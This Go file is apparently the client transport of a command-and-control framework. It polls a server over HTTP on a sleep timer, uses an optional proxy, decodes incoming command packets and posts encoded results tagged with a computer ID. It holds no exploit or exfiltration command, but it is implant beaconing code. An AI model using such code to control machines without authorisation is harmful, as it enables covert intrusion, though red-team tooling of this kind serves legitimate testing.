package client

import (
	"bytes"
	"fmt"
	"io/ioutil"
	"net/http"
	"net/url"
	"time"

	"github.com/dobin/antnium/pkg/campaign"
	"github.com/dobin/antnium/pkg/common"
	"github.com/dobin/antnium/pkg/model"
	log "github.com/sirupsen/logrus"
)

// UpstreamWs is a connection to the server via REST
type UpstreamRest struct {
	chanIncoming chan model.Packet // Provides packets from server to client
	chanOutgoing chan model.Packet // Consumes packets from client to server

	packetGetTimer *SleepTimer
	coder          model.Coder

	config   *ClientConfig
	campaign *campaign.Campaign
}

func MakeUpstreamRest(config *ClientConfig, campaign *campaign.Campaign) UpstreamRest {
	coder := model.MakeCoder(campaign)

	packetGetTimer := MakeSleepTimer()

	u := UpstreamRest{
		chanIncoming:   make(chan model.Packet),
		chanOutgoing:   make(chan model.Packet),
		packetGetTimer: &packetGetTimer,
		coder:          coder,
		config:         config,
		campaign:       campaign,
	}
	return u
}

// Connect creates a REST connection to the server, or returns an error
func (d *UpstreamRest) Connect() error {
	proxyUrl, ok := d.campaign.GetProxy()
	if ok {
		if proxyUrl, err := url.Parse(proxyUrl); err == nil && proxyUrl.Scheme != "" && proxyUrl.Host != "" {
			proxyUrlFunc := http.ProxyURL(proxyUrl)
			http.DefaultTransport.(*http.Transport).Proxy = proxyUrlFunc
			log.Infof("Using proxy: %s", proxyUrl)
		} else {
			log.Warnf("Could not parse proxy %s: %s", proxyUrl, err.Error())
		}
	}

	// Build a empty ping packet to test
	arguments := make(model.PacketArgument)
	response := make(model.PacketResponse)
	packet := d.config.MakeClientPacket("ping", arguments, response)
	err := d.sendPacket(*packet)
	if err != nil {
		log.WithFields(log.Fields{
			"error": err,
		}).Info("Error sending packet")
	}

	return err
}

// Start is a Thread responsible for receiving packets from server, lifetime:app
func (d *UpstreamRest) Start() {
	go func() {

		for {
			time.Sleep(d.packetGetTimer.getSleepDuration())

			// Try getting a packet from server
			packet, err := d.GetPacket()
			if err != nil {
				if err == ErrNoPacketsFound {
					fmt.Print(".")
					continue // no packets for us, maybe later
				}

				log.WithFields(log.Fields{
					"error": err,
				}).Debug("Error get packet")

				// Sleep and try again
				continue
			}
			// Notify state that we received a packet
			d.packetGetTimer.tick()

			// Send it to Client
			d.ChanIncoming() <- packet
		}

	}()

	go func() {
		for {
			packet := <-d.ChanOutgoing()

			// Send answer to server
			err := d.sendPacket(packet)
			if err != nil {
				log.WithFields(log.Fields{
					"error": err,
				}).Info("Error sending packet")
			}
		}
	}()
}

func (d *UpstreamRest) GetPacket() (model.Packet, error) {
	url := d.PacketGetUrl()
	resp, err := d.HttpGet(url)
	if err != nil {
		return model.Packet{}, fmt.Errorf("Error requesting URL %s with error %s", url, err)
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return model.Packet{}, fmt.Errorf("Error status code %d in requesting URL %s", resp.StatusCode, url)
	}
	bodyBytes, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return model.Packet{}, fmt.Errorf("Error reading body of URL %s with error %s", url, err)
	}

	if len(bodyBytes) <= 0 {
		return model.Packet{}, ErrNoPacketsFound
	}
	packet, err := d.coder.DecodeData(bodyBytes)
	if err != nil {
		return model.Packet{}, fmt.Errorf("Error decoding body of URL %s with error %s", url, err)
	}
	return packet, nil
}

func (d *UpstreamRest) sendPacket(packet model.Packet) error {
	url := d.PacketSendUrl()

	// Setup response
	packet.ComputerId = d.config.ComputerId

	common.LogPacket("UpstreamRest:send()", packet)

	data, err := d.coder.EncodeData(packet)
	if err != nil {
		return fmt.Errorf("Could not send answer to URL %s: %s", url, err.Error())
	}

	resp, err := d.HttpPost(url, bytes.NewReader(data))
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("Error status code %d in requesting URL %s", resp.StatusCode, url)
	}

	return nil
}

// Connected returns false if we know that that websocket connection is dead
func (d *UpstreamRest) Connected() bool {
	return true
}

func (d *UpstreamRest) ChanIncoming() chan model.Packet {
	return d.chanIncoming
}
func (d *UpstreamRest) ChanOutgoing() chan model.Packet {
	return d.chanOutgoing
}